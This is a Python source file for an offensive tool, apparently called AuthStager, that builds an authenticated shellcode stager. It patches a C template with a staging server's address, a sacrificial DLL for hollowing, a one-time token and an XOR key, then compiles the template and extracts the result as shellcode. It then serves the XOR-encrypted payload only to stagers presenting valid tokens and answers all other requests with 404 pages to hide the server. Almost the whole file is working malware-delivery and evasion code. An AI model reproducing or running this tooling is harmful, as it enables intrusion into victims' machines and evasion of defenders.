import argparse
import pefile
import re
import subprocess
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
import random
from colorama import init, Fore

def arg_parser():
    parser = argparse.ArgumentParser(description="Generate Authenticated Stager")
    parser.add_argument('-f', "--file", type=str, help="path to the input shellcode", metavar="")
    parser.add_argument('-H', "--Host", type=str, help="IP/ Domain of the staging server", metavar="")
    parser.add_argument('-p', "--protocol", type=str, help="Protocol: http/https (Default: http)", metavar="", default="http")
    parser.add_argument('-s', "--port", type=int, help="Port. (Default: 80 for http and 443 for https)", metavar="")
    parser.add_argument('-d', "--dll", type=str, help="DLL to use for Hollowing. (Default: C:\Windows\System32\Chakra.dll)", metavar="", default="C:\\Windows\\System32\\Chakra.dll")
    parser.add_argument('-t', "--tokens", type=int, help="Authentication Token's validity. (Default:1)", metavar="", default=1)
    parser.add_argument('-x', "--output", type=str, help="Output Format:c, raw", metavar="")

    args = parser.parse_args()
    input_file = args.file
    host = args.Host
    protocol = args.protocol
    if (protocol == "http"):
        if (args.port):
            port = args.port
        else:
            port = 80
    elif(protocol == "https"):
        if (args.port):
            port=args.port
        else:
            port=443                            
    if (input_file == None):
        print("[-] Input File Required")
        exit()
    elif (args.Host == None):
        print("[-] IP/ Domain Required")  
        exit()

    try:
        with open(input_file, 'rb') as bindata:
            data = bindata.read()
    except Exception as e:
        print(f"[-] {e}")
        exit()

    if (args.tokens < 1 or args.tokens > 5):
        print("[-] Minimum 1 Token or Maximum 5 Tokens are required")
        exit()

    return {"data": data, "host": host, "protocol": protocol, "port": port, "dll" : args.dll, "output" : args.output, "tokens": args.tokens}     

def str_transform(code, string):
    res = ''
    if (code == 'a'):
        res = res + '{'
        for char in string:
            if char == '\\':
                res = res + "'\\\\', "
            else:
                res = res + "'" + char + "', "
        res = res + "0};"
    if (code == 'u'):
        res = res + '{'
        for char in string:
            if char == '\\':
                res = res + "L'\\\\', "
            else:
                res = res + "L'" + char + "', "
        res = res + "0};"        
    return res            

def replace_src(data, token, key):
    with open("./Assets/stager.c", 'r') as srcfile:
        content = srcfile.read()
        domain = re.findall("domain\[\] = (.+)", content)[0]
        content = content.replace(domain, str_transform("a", data["host"]))
        
        port = re.findall("nServerPort = (\d+)", content)[0]
        content = content.replace(f"nServerPort = {port};", f"nServerPort = {data['port']};")
        
        dll = re.findall("wsSacrificialDLL\[\] = (.+)", content)[0]
        content = content.replace(dll, str_transform("u", data["dll"]))
        dll = re.findall("wsSacrificialDLL\[\] = (.+)", content)[0]

        token_str = re.findall("token = (.+);", content)[0]
        content = content.replace(token_str, f"0x{list(token.keys())[0]}") 


        key_str = re.findall("unsigned char	cKey = .+;", content)[0]
        content = content.replace(key_str, f"unsigned char	cKey = {key};")
                
        
    
    with open("./Assets/stager.c", 'w') as srcfile:
        srcfile.write(content)

def compile_parse_bin(format):
    p = subprocess.Popen(["make"], cwd="./Assets/", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    p.wait()
    try:
        pe = pefile.PE('stager.exe')
        for section in pe.sections:
            if section.Name == b'.text\x00\x00\x00':
                bindata = section.get_data()
                break
    except Exception as e:
        print(f"{e}")   
        exit()

    if (format == None or format == 'raw'):
        print("[+] Shellcode Written To: stager.bin")
        with open("stager.bin", 'wb') as binfile:
            binfile.write(bindata)

    elif (format == 'c'):
        with open('shellcode.c', 'w') as cfile:
            cfile.write("unsigned char shellcode[] = {")
            for i in range(len(bindata) - 1):
                cfile.write('0x{0:02x},'.format(bindata[i]))
            cfile.write('0x{0:02x}}};'.format(bindata[len(bindata)-1]))
        print("[+] Shellcode Written To: shellcode.c")    
                   

def genToken(val):
    x = {}
    x[str(hex(uuid.uuid4().int & (1 << 64)-1))[2:]] = val

    return x    

class CustomException(Exception):
    pass

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    resp_data = b''
    auth_token = {}
    def do_GET(self):
        if (self.path == '/index.php'):
            
            headers = self.headers
            try:
                authstr = re.findall("WWW-Authenticate: .+", str(headers))[0].split(':')[1].strip().strip("\x00")
                if authstr not in self.auth_token:
                    raise CustomException("[-] Invalid Authentication Detected")
                
                elif self.auth_token[authstr] == 0:
                    raise CustomException("[-] Expired Token Detected")

                self.auth_token[authstr] = self.auth_token[authstr] - 1
                self.send_response(200)
                self.end_headers()
                self.wfile.write(len(self.resp_data).to_bytes(4, 'little') + self.resp_data)
            except CustomException as e:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 - Not Found\n')
                print(e)   
            except IndexError:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'404 - Not Found\n')    
                print("[-] Invalid Authentication Detected")
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'404 - Not Found\n')
            
def xor_encrypt(data, key):
    xor_data = b''
    for byte in data:
        xor_data = xor_data + (byte ^ key).to_bytes(1, byteorder='little')
        
    return xor_data

def serve_server(data, port, token, key):


    data = xor_encrypt(data, key)
    def handler(*args, **kwargs):
        SimpleHTTPRequestHandler.resp_data = data  
        SimpleHTTPRequestHandler.auth_token = token
        return SimpleHTTPRequestHandler(*args, **kwargs)

    try:
        httpd = HTTPServer(('', port), handler)
        print("[+] HTTP Server Running on Port:", port)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("[#] Shutting Down Server")
        httpd.server_close()
    

def print_banner():
    init(autoreset=True)
    ascii_banner = """
    ___         __  __   _____ __                       
   /   | __  __/ /_/ /_ / ___// /_____ _____ ____  _____
  / /| |/ / / / __/ __ \\__ \/ __/ __ `/ __ `/ _ \/ ___/
 / ___ / /_/ / /_/ / / /__/ / /_/ /_/ / /_/ /  __/ /    
/_/  |_\__,_/\__/_/ /_/____/\__/\__,_/\__, /\___/_/     
                                     /____/             

"""
    print(Fore.CYAN + ascii_banner)
    print(Fore.GREEN + "Author   : HulkOperator")
    print(Fore.YELLOW + "Copyright 2024 HulkOperator\n")


if __name__ == '__main__':
    print_banner()
    args = arg_parser()
    token = genToken(args["tokens"])
    key = random.randrange(256)
    replace_src(args, token, hex(key))
    compile_parse_bin(args["output"])
    serve_server(args["data"], args["port"], token, key)
        